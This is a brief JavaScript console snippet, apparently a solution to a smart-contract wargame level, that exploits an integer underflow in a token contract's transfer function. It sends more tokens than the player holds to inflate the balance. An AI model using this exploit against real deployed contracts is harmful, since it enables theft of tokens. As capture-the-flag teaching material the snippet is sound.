//confirm current token balance:
(await contract.balanceOf(player)).toString()

//try sending more tokens than we have 
await contract.transfer(contract.address, 21)

//Now thanks to an underflow, we have lots of tokens
(await contract.balanceOf(player)).toString()